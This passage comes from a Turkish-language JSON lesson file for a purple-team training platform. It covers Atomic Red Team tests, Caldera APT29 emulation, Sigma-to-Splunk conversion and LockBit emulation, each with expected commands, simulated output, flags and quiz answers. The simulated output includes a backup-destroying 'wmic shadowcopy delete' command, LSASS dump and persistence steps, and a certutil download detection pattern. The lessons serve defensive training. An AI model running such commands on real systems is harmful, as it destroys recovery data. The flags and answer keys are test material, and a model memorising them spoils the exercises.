                "Son sızma testi bulguları için MITRE Navigator formatında boşluk analizi (Gap Analysis) özet raporunu derleyin.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `python3 gap_analysis.py --report pentest.json` komutu ezbere yazılan bir kod değil; python3 gap_analysis.py: Hücum ile savunma ekiplerinin sonuçlarını karşılaştıran analiz betiğidir. --report pentest.json: Pentest bulgularını girdi olarak alır ve 'Hangi saldırıları gördük, hangilerinde alarm vermedik?' sorusunun yanıtını (Isı Haritası - Heatmap) çıkarır."
        }
    },
    {
        "id": "purple-201",
        "track": "purple",
        "title": "BAS ve Atomic Red Team: Birim Test Mantığıyla Güvenlik",
        "level": "2. Saldırı Simülasyonu ve Otomasyon",
        "badge": "BAS & ATOMIC RED TEAM",
        "theory": "### Yazılım Testi Gibi Güvenlik Testi: BAS & Atomic Tests\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nİtfaiyecilerin yangın çıkmasını beklemeden binanın ortasında kontrollü tatbikat dumanı sıkıp dedektörlerin ve fıskiyelerin çalışıp çalışmadığını tek tek denemesidir (Birim Test Mantığı).\n\nHer gün yüzlerce sunucuda tek tek manuel pentest yapmak imkansızdır. **BAS (Breach and Attack Simulation)** sistemleri, saldırgan tekniklerini güvenli ve kontrollü scriptlerle sürekli test eder.\n\n#### 1. Atomic Red Team (Red Canary):\nMITRE ATT&CK matrisindeki her bir teknik için yazılmış küçük, bağımsız test scriptleridir (PowerShell / Bash).\n* Sisteme gerçek fidye yazılımı bulaştırmaz; yalnızca o zararlının yaptığı operasyonu taklit eder.",
        "mission": "Atomic Red Team motorunu kullanarak T1082 (System Information Discovery) tekniğini simüle edin.",
        "expectedCommand": "Invoke-AtomicTest T1082 -TestNumbers 1",
        "acceptedCommands": [
            "powershell Invoke-AtomicTest T1082",
            "atomic-test T1082",
            "Invoke-AtomicTest T1082"
        ],
        "hintExplanation": "<p><strong>Invoke-AtomicTest:</strong> Red Canary tarafından geliştirilen ve saldırı tekniklerini zararsız mini testler olarak çalıştıran PowerShell fonksiyonudur.</p>\n<p><strong>T1082:</strong> 'System Information Discovery' tekniğidir (systeminfo.exe çalıştırılması).</p>\n<p><strong>-TestNumbers 1:</strong> Bu teknik altındaki 1 numaralı standart testi çalıştırır; böylece EDR'ın alarm verip vermediği anında doğrulanır.</p>",
        "terminalSuccessOutput": "PathToEngine: C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicTest.ps1\nExecuting test: T1082-1 System Information Discovery via systeminfo.exe\n[STDOUT]: Host Name: LFL-CORP-WORKSTATION ... OS Version: 10.0.19045\n[+] Test başarıyla tamamlandı.\n[BLUE VERIFICATION]: Sysmon Event ID 1 yakalandı: Parent=powershell.exe -> Child=systeminfo.exe\n[FLAG] LFL{atomic_red_team_t1082_simulated}",
        "flag": "LFL{atomic_red_team_t1082_simulated}",
        "nextId": "purple-202",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (2. Saldırı Simülasyonu ve Otomasyon) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `Invoke-AtomicTest T1082 -TestNumbers 1` komutunu kullanmamızın sebebi; **BAS ve Atomic Red Team: Birim Test Mantığıyla Güvenlik** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. Invoke-AtomicTest: Red Canary tarafından geliştirilen ve saldırı tekniklerini zararsız mini testler olarak çalıştıran PowerShell fonksiyonudur. T1082: 'System Information Discovery' tekniğidir (systeminfo.exe çalıştırılması). -TestNumbers 1: Bu teknik altındaki 1 numaralı standart testi çalıştırır; böylece EDR'ın alarm verip vermediği anında doğrulanır.",
        "cmdAnatomy": [
            {
                "token": "Invoke-AtomicTest",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (Invoke-AtomicTest)."
            },
            {
                "token": "T1082",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (T1082)."
            },
            {
                "token": "-TestNumbers",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-TestNumbers)."
            },
            {
                "token": "1",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (1)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "PathToEngine: C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicTest.ps1",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Executing test: T1082-1 System Information Discovery via systeminfo.exe",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[STDOUT]: Host Name: LFL-CORP-WORKSTATION ... OS Version: 10.0.19045",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] Test başarıyla tamamlandı.",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "Invoke-AtomicTest",
                "desc": "BAS ve Atomic Red Team: Birim Test Mantığıyla Güvenlik görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `Invoke-AtomicTest T1082 -TestNumbers 1` komutunun temel amacı nedir?",
            "options": [
                "Atomic Red Team motorunu kullanarak T1082 (System Information Discovery) tekniğini simüle edin.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `Invoke-AtomicTest T1082 -TestNumbers 1` komutu ezbere yazılan bir kod değil; Invoke-AtomicTest: Red Canary tarafından geliştirilen ve saldırı tekniklerini zararsız mini testler olarak çalıştıran PowerShell fonksiyonudur. T1082: 'System Information Discovery' tekniğidir (systeminfo.exe çalıştırılması). -TestNumbers 1: Bu teknik altındaki 1 numaralı standart testi çalıştırır; böylece EDR'ın alarm verip vermediği anında doğrulanır."
        }
    },
    {
        "id": "purple-202",
        "track": "purple",
        "title": "Gelişmiş Simülasyon: Caldera & APTSimulator",
        "level": "2. Saldırı Simülasyonu ve Otomasyon",
        "badge": "CALDERA & APT EMULATION",
        "theory": "### Gerçek Düşmanı Taklit Etmek: APT Emülasyonu\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBanka güvenliğini test etmek için şehre profesyonel bir oyuncu çetesi gönderip bankanın kasasına giden tüm yolları adım adım canlandırmaktır (APT Emülasyonu).\n\nBireysel testlerin ötesinde, organize siber casusluk gruplarının (APT29 - Cozy Bear vb.) saldırı senaryolarını uçtan uca otomatik taklit eden sistemler kullanılır.\n\n#### 1. MITRE Caldera:\nAjan-tabanlı akıllı siber saldırı simülasyon platformudur.\n* Caldera sunucusuna bağlı ajanlar, verilen hedefe göre otonom olarak lateral movement yapar ve Blue Team'in hangi adımda saldırganı fark ettiğini kronometreyle ölçer.",
        "mission": "Caldera motoru üzerinde APT29 (Cozy Bear) siber casusluk grubunun saldırı profilini emüle eden tatbikatı başlatın.",
        "expectedCommand": "python3 caldera_runner.py --adversary \"APT29\"",
        "acceptedCommands": [
            "APTSimulator.bat --test-all",
            "caldera --adversary APT29",
            "python3 caldera_runner.py",
            "APTSimulator.bat"
        ],
        "hintExplanation": "<p><strong>python3 caldera_runner.py:</strong> MITRE Caldera otonom siber tatbikat platformunun tetikleyicisidir.</p>\n<p><strong>--adversary \"APT29\":</strong> Gerçek dünyadaki organize tehdit aktörü APT29 grubunun kullandığı taktik ve araçları taklit eder; kurum savunmasının bu aktöre karşı dayanıklılığı test edilir.</p>",
        "terminalSuccessOutput": "[Caldera v5.0] Running Adversary Emulation: APT29 (Cozy Bear)...\n[*] Step 1: User Discovery (whoami /groups) -> COMPLETED\n[*] Step 2: Persistence via Registry Run Key -> COMPLETED\n[*] Step 3: LSASS Memory Dump Simulation -> BLOCKED BY EDR!\n[BLUE TELEMETRY]: 24 Alarm Oluştu, 3 Davranış SIEM'e Düşmedi.\n[FLAG] LFL{apt_simulation_caldera_suite_executed}",
        "flag": "LFL{apt_simulation_caldera_suite_executed}",
        "nextId": "purple-301",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (2. Saldırı Simülasyonu ve Otomasyon) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `python3 caldera_runner.py --adversary \"APT29\"` komutunu kullanmamızın sebebi; **Gelişmiş Simülasyon: Caldera & APTSimulator** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. python3 caldera_runner.py: MITRE Caldera otonom siber tatbikat platformunun tetikleyicisidir. --adversary \"APT29\": Gerçek dünyadaki organize tehdit aktörü APT29 grubunun kullandığı taktik ve araçları taklit eder; kurum savunmasının bu aktöre karşı dayanıklılığı test edilir.",
        "cmdAnatomy": [
            {
                "token": "python3",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (python3)."
            },
            {
                "token": "caldera_runner.py",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (caldera_runner.py)."
            },
            {
                "token": "--adversary",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--adversary)."
            },
            {
                "token": "\"APT29\"",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (\"APT29\")."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[Caldera v5.0] Running Adversary Emulation: APT29 (Cozy Bear)...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[*] Step 1: User Discovery (whoami /groups) -> COMPLETED",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[*] Step 2: Persistence via Registry Run Key -> COMPLETED",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[*] Step 3: LSASS Memory Dump Simulation -> BLOCKED BY EDR!",
                "meaning": "Güvenlik politikasının devreye girerek yetkisiz erişimi veya saldırı paketini **engellediğini** gösterir."
            }
        ],
        "beginnerTerms": [
            {
                "term": "python3",
                "desc": "Gelişmiş Simülasyon: Caldera & APTSimulator görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `python3 caldera_runner.py --adversary \"APT29\"` komutunun temel amacı nedir?",
            "options": [
                "Caldera motoru üzerinde APT29 (Cozy Bear) siber casusluk grubunun saldırı profilini emüle eden tatbikatı başlatın.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `python3 caldera_runner.py --adversary \"APT29\"` komutu ezbere yazılan bir kod değil; python3 caldera_runner.py: MITRE Caldera otonom siber tatbikat platformunun tetikleyicisidir. --adversary \"APT29\": Gerçek dünyadaki organize tehdit aktörü APT29 grubunun kullandığı taktik ve araçları taklit eder; kurum savunmasının bu aktöre karşı dayanıklılığı test edilir."
        }
    },
    {
        "id": "purple-301",
        "track": "purple",
        "title": "Algılama Mühendisliği (Detection Engineering): Sigma & YARA",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "DETECTION ENGINEERING & SIGMA",
        "theory": "### Saldırıyı Kurala Dönüştürmek: Tespit Mühendisliği\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nTüm dünyada geçerli olan bir para basım şablonudur. Bir kez \"Sahte para nasıl anlaşılır\" kuralını (Sigma) yazarsınız; ister Türk Lirası ister Dolar sayma makinesi olsun kuralı anında o makineye uyarlayıp çalıştırırsınız.\n\nRed Team bir zafiyet bulup içeri girdiğinde ya da yeni bir bypass yöntemi denediğinde, Purple Team analisti bunu inceler ve savunmaya **kalıcı bir kural** yazar.\n\n#### 1. Sigma Kuralları:\nSigma, SIEM dünyasının ortak dilidir. Bir kere YAML formatında kural yazarsınız; bunu Splunk, Elastic veya Sentinel dillerine dönüştürebilirsiniz.",
        "mission": "Hazırlanan certutil Sigma tespit kuralını Splunk arama sorgusuna derleyen dönüştürücü komutunu çalıştırın.",
        "expectedCommand": "sigmac -t splunk rules/certutil_download.yml",
        "acceptedCommands": [
            "sigmac -t splunk -c sysmon rules/certutil_download.yml",
            "sigmac rules/certutil_download.yml",
            "sigmac -t splunk rules/certutil.yml"
        ],
        "hintExplanation": "<p><strong>sigmac:</strong> Sigma Kural Derleyicisidir (Sigma Compiler). Ortak kural şablonlarını farklı SIEM dillerine çevirir.</p>\n<p><strong>-t splunk:</strong> Çıktının Splunk arama dili (SPL) formatında olmasını sağlar.</p>\n<p><strong>rules/certutil_download.yml:</strong> Yazdığımız genel kural dosyasıdır; derlendiğinde doğrudan Splunk SIEM alarmına dönüşür.</p>",
        "terminalSuccessOutput": "[SIGMA CONVERTER v0.22]\nHedef SIEM Motoru: Splunk (Sysmon Parser)\nÜretilen SPL Sorgusu:\nindex=sysmon EventCode=1 Image=\"*\\\\certutil.exe\" (CommandLine=\"*-urlcache*\" OR CommandLine=\"*-split*\")\n[KURAL BAŞARIYLA DERLENDİ]: Korelasyon motoru kuralı aktif edildi.\n[FLAG] LFL{detection_engineering_sigma_to_splunk}",
        "flag": "LFL{detection_engineering_sigma_to_splunk}",
        "nextId": "purple-302",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Sürekli İyileştirme ve Tehdit Bilgisi) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `sigmac -t splunk rules/certutil_download.yml` komutunu kullanmamızın sebebi; **Algılama Mühendisliği (Detection Engineering): Sigma & YARA** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. sigmac: Sigma Kural Derleyicisidir (Sigma Compiler). Ortak kural şablonlarını farklı SIEM dillerine çevirir. -t splunk: Çıktının Splunk arama dili (SPL) formatında olmasını sağlar. rules/certutil_download.yml: Yazdığımız genel kural dosyasıdır; derlendiğinde doğrudan Splunk SIEM alarmına dönüşür.",
        "cmdAnatomy": [
            {
                "token": "sigmac",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (sigmac)."
            },
            {
                "token": "-t",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-t)."
            },
            {
                "token": "splunk",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (splunk)."
            },
            {
                "token": "rules/certutil_download.yml",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (rules/certutil_download.yml)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[SIGMA CONVERTER v0.22]",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Hedef SIEM Motoru: Splunk (Sysmon Parser)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Üretilen SPL Sorgusu:",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "index=sysmon EventCode=1 Image=\"*\\\\certutil.exe\" (CommandLine=\"*-urlcach...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "sigmac",
                "desc": "Algılama Mühendisliği (Detection Engineering): Sigma & YARA görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `sigmac -t splunk rules/certutil_download.yml` komutunun temel amacı nedir?",
            "options": [
                "Hazırlanan certutil Sigma tespit kuralını Splunk arama sorgusuna derleyen dönüştürücü",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `sigmac -t splunk rules/certutil_download.yml` komutu ezbere yazılan bir kod değil; sigmac: Sigma Kural Derleyicisidir (Sigma Compiler). Ortak kural şablonlarını farklı SIEM dillerine çevirir. -t splunk: Çıktının Splunk arama dili (SPL) formatında olmasını sağlar. rules/certutil_download.yml: Yazdığımız genel kural dosyasıdır; derlendiğinde doğrudan Splunk SIEM alarmına dönüşür."
        }
    },
    {
        "id": "purple-302",
        "track": "purple",
        "title": "Siber Tehdit İstihbaratı (CTI) & Tehdit Odaklı Simülasyon",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "CTI & THREAT-INFORMED DEFENSE",
        "theory": "### Tehditten Bir Adım Önde: CTI Odaklı Savunma\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nHava durumu raporuna bakıp \"Yarın fırtına çıkacak\" haberini önceden alarak, fırtına kapıya dayanmadan çatıyı ve pencereleri onarmaktır (Tehdit İstihbaratı Odaklı Savunma).\n\nEn üst seviye Purple Team çalışması, kurumun sektörüne saldıran gerçek dünyadaki aktörleri inceleyerek proaktif tatbikat yapmaktır.\n\n#### 1. CTI Veri Akışları & TTPs:\nDavid Bianco'nun Ağrı Piramidi: Saldırganın IP'sini değiştirmek 1 saniye sürer, ancak saldırı alışkanlığını ve taktiklerini değiştirmek aylar alır.",
        "mission": "Gelen CTI raporundaki yeni LockBit fidye yazılımının gölge kopya silme (T1490) tekniğini test ederek kalkanı doğrulayın.",
        "expectedCommand": "python3 cti_emulator.py --threat LockBit --ttp T1490",
        "acceptedCommands": [
            "lfl-cti-emulate --threat 'LockBit-3.0' --ttp T1490 --engine wmi",
            "cti-emulate LockBit",
            "python3 cti_emulator.py"
        ],
        "hintExplanation": "<p><strong>python3 cti_emulator.py:</strong> Gelen istihbarat raporlarını canlı teste dönüştüren doğrulama betiğidir.</p>\n<p><strong>--threat LockBit:</strong> Kurumları hedef alan LockBit fidye yazılımı tehdit profilini seçer.</p>\n<p><strong>--ttp T1490:</strong> 'Inhibit System Recovery' tekniğidir (Windows yedeklerinin silinmesi). EDR ve yedekleme sistemlerinin bu saldırıyı durdurabildiği teyit edilir.</p>",
        "terminalSuccessOutput": "[CTI EMULATION ENGINE]\nHedef Tehdit Profili: LockBit 3.0 / Ransomware Operator\nSimüle Edilen Komut: wmic shadowcopy delete /nointeractive\n[TEST DENETİMİ]:\n-> EDR Engelleme: BAŞARILI (Tampon belleğe müdahale edildi)\n-> SOC Alarmları: High Severity 'WMI Shadow Copy Deletion' üretildi.\n[DURUM]: Şirket savunması LockBit 3.0 varyantına karşı %100 dirençli.\n[FLAG] LFL{cti_threat_informed_defense_validated}",
        "flag": "LFL{cti_threat_informed_defense_validated}",
        "nextId": "purple-303",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Sürekli İyileştirme ve Tehdit Bilgisi) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `python3 cti_emulator.py --threat LockBit --ttp T1490` komutunu kullanmamızın sebebi; **Siber Tehdit İstihbaratı (CTI) & Tehdit Odaklı Simülasyon** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. python3 cti_emulator.py: Gelen istihbarat raporlarını canlı teste dönüştüren doğrulama betiğidir. --threat LockBit: Kurumları hedef alan LockBit fidye yazılımı tehdit profilini seçer. --ttp T1490: 'Inhibit System Recovery' tekniğidir (Windows yedeklerinin silinmesi). EDR ve yedekleme sistemlerinin bu saldırıyı durdurabildiği teyit edilir.",
        "cmdAnatomy": [
            {
                "token": "python3",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (python3)."
            },
            {
                "token": "cti_emulator.py",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (cti_emulator.py)."
            },
            {
                "token": "--threat",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--threat)."
            },
            {
                "token": "LockBit",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (LockBit)."
            },
            {
                "token": "--ttp",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (--ttp)."
            },
            {
                "token": "T1490",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (T1490)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[CTI EMULATION ENGINE]",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Hedef Tehdit Profili: LockBit 3.0 / Ransomware Operator",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Simüle Edilen Komut: wmic shadowcopy delete /nointeractive",
                "meaning": "İşlemin veya bağlantının **başarıyla** gerçekleştiğini doğrulayan sonuç satırıdır."
            },
            {
                "snippet": "[TEST DENETİMİ]:",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "python3",
                "desc": "Siber Tehdit İstihbaratı (CTI) & Tehdit Odaklı Simülasyon görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `python3 cti_emulator.py --threat LockBit --ttp T1490` komutunun temel amacı nedir?",
            "options": [
                "Gelen CTI raporundaki yeni LockBit fidye yazılımının gölge kopya silme (T1490) tekniğini test ederek kalkanı doğrulayın.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `python3 cti_emulator.py --threat LockBit --ttp T1490` komutu ezbere yazılan bir kod değil; python3 cti_emulator.py: Gelen istihbarat raporlarını canlı teste dönüştüren doğrulama betiğidir. --threat LockBit: Kurumları hedef alan LockBit fidye yazılımı tehdit profilini seçer. --ttp T1490: 'Inhibit System Recovery' tekniğidir (Windows yedeklerinin silinmesi). EDR ve yedekleme sistemlerinin bu saldırıyı durdurabildiği teyit edilir."
        }
    },
    {
        "id": "purple-303",
        "track": "purple",
        "title": "Saldırı Simülasyonu: Atomic Red Team ile T1059 Tatbikatı",
        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
        "badge": "ATOMIC RED TEAM T1059 SIMULATION",
        "theory": "### Güvenliği Birim Test Mantığıyla Doğrulamak: Atomic Red Team\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBinadaki yangın alarmının düğmesine bilerek basıp 'Bakalım sirenler çalacak mı, itfaiyeye sinyal gidecek mi?' diye tatbikat yapmaktır. Binayı yakmazsınız, sadece alarmın çalışıp çalışmadığını 10 saniyede test edersiniz.\n\n#### MITRE T1059.001 (PowerShell İcrası):\nAtomic Red Team, PowerShell üzerinden base64 kodlu şüpheli bir komut çalıştırır. Purple Team'in görevi: Blue Team'in SIEM/EDR konsolunda bu eylemin anında 'Yüksek Tehdit' olarak düşüp düşmediğini teyit etmektir.",
        "mission": "PowerShell komut çalıştırma tekniğini atomik birim testi olarak simüle etmek için Invoke-AtomicTest T1059.001 -TestNumbers 1 komutunu çalıştırın.",
        "expectedCommand": "Invoke-AtomicTest T1059.001 -TestNumbers 1",
        "acceptedCommands": [
            "Invoke-AtomicTest T1059.001 -TestNumbers 1",
            "Invoke-AtomicTest T1059.001",
            "Invoke-AtomicTest 'T1059.001' -TestNumbers 1"
        ],
        "hintExplanation": "<p><strong>Invoke-AtomicTest:</strong> Red Canary tarafından geliştirilen açık kaynaklı BAS (Breach and Attack Simulation) PowerShell modülüdür.</p><p><strong>T1059.001:</strong> MITRE ATT&CK PowerShell yürütme tekniğidir.</p>",
        "terminalSuccessOutput": "PathToEngine: C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicTest.ps1\nExecuting test: T1059.001-1 Mimikatz / Encoded Command Execution Simulation\n[+] Atomic Test Executed Safely.\n[SIEM DOĞRULAMASI] Event ID 4104 (Script Block Logging) SIEM'e düştü!\n[EDR DURUMU] Alarm üretildi: 'Suspicious Encoded PowerShell Invocation'\n[FLAG] LFL{purple_atomic_red_t1059_powershell_verified}",
        "flag": "LFL{purple_atomic_red_t1059_powershell_verified}",
        "nextId": "purple-304",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Sürekli İyileştirme ve Tehdit Bilgisi) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `Invoke-AtomicTest T1059.001 -TestNumbers 1` komutunu kullanmamızın sebebi; **Saldırı Simülasyonu: Atomic Red Team ile T1059 Tatbikatı** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. Invoke-AtomicTest: Red Canary tarafından geliştirilen açık kaynaklı BAS (Breach and Attack Simulation) PowerShell modülüdür. T1059.001: MITRE ATT&CK PowerShell yürütme tekniğidir.",
        "cmdAnatomy": [
            {
                "token": "Invoke-AtomicTest",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (Invoke-AtomicTest)."
            },
            {
                "token": "T1059.001",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (T1059.001)."
            },
            {
                "token": "-TestNumbers",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-TestNumbers)."
            },
            {
                "token": "1",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (1)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "PathToEngine: C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicTest.ps1",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Executing test: T1059.001-1 Mimikatz / Encoded Command Execution Simulation",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] Atomic Test Executed Safely.",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[SIEM DOĞRULAMASI] Event ID 4104 (Script Block Logging) SIEM'e düştü!",
                "meaning": "Güvenlik politikasının devreye girerek yetkisiz erişimi veya saldırı paketini **engellediğini** gösterir."
            }
        ],
        "beginnerTerms": [
            {
                "term": "Invoke-AtomicTest",
                "desc": "Saldırı Simülasyonu: Atomic Red Team ile T1059 Tatbikatı görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `Invoke-AtomicTest T1059.001 -TestNumbers 1` komutunun temel amacı nedir?",
            "options": [
                "PowerShell komut çalıştırma tekniğini atomik birim testi olarak simüle etmek için Invoke-AtomicTest T1059.001 -TestNumbers 1",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `Invoke-AtomicTest T1059.001 -TestNumbers 1` komutu ezbere yazılan bir kod değil; Invoke-AtomicTest: Red Canary tarafından geliştirilen açık kaynaklı BAS (Breach and Attack Simulation) PowerShell modülüdür. T1059.001: MITRE ATT&CK PowerShell yürütme tekniğidir."
        }
    },
    {
        "id": "purple-304",
        "track": "purple",
        "title": "Saldırı Simülasyonu: T1003 LSASS Credential Dump Doğrulama",
